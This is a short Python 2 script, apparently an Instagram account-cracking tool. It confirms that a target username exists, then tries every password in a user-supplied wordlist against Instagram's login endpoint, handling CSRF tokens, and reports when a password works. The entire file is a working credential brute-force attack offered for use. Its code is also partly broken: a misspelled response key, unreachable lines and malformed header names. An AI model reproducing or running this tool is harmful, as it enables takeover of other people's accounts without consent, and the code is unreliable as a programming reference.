"""
create by mr4fun
"""

import requests, sys
import json


def go(user,pwd):
	url = "https://www.instagram.com/accounts/login/ajax/"
	data = {
		"username":user,
		"password":pwd
	}
	sess = requests.Session()
	sess.cookies.update ({'sessionid' : '', 'mid' : '', 'ig_pr' : '1', 'ig_vw' : '1920', 'csrftoken' : '',  's_network' : '', 'ds_user_id' : ''})
	sess.headers.update({
		'UserAgent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
		'x-instagram-ajax':'1',
		'X-Requested-With': 'XMLHttpRequest',
		'origin': 'https://www.instagram.com',
		'ContentType' : 'application/x-www-form-urlencoded',
		'Connection': 'keep-alive',
		'Accept': '*/*',
		'Referer': 'https://www.instagram.com',
		'authority': 'www.instagram.com',
		'Host' : 'www.instagram.com',
		'Accept-Language' : 'en-US;q=0.6,en;q=0.4',
		'Accept-Encoding' : 'gzip, deflate'
	})
	r = sess.get('https://www.instagram.com/')
	sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
	r = sess.post('https://www.instagram.com/accounts/login/ajax/',data=data)
	sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
	print("\r[*] trying password : %s"%(pwd)),;sys.stdout.flush()
	data = json.loads(r.text)
	if data["status"] == "fail":
		print(data["massege"])

	elif data['authenticated'] == True:
		print("")
		print("[*] password found %s with username : %s"%(pwd,user))

def input():
	user = raw_input("[*] input user name : ")
	print("[*] checked the username found or not")
	try:
		r = requests.get("https://www.instagram.com/%s/?__a=1"%(user))
		if r.status_code == 404:
			print("[!] username %s not found"%(user))
			exit()
		else:
			print("[*] username found")
			next
	except:
		exit()

	pwd = raw_input("[*] input the password list : ")
	file = open(pwd, "r").readlines()
	if len(file) == 0:
		print("[!] the file is nothing list")
		return input()

		print("[*] loaded %s password"%(len(file)))

	for i in file:
		go(user,i.strip())

try:
	input()

except KeyboardInterrupt:
	from os import system
	system("clear")
	exit()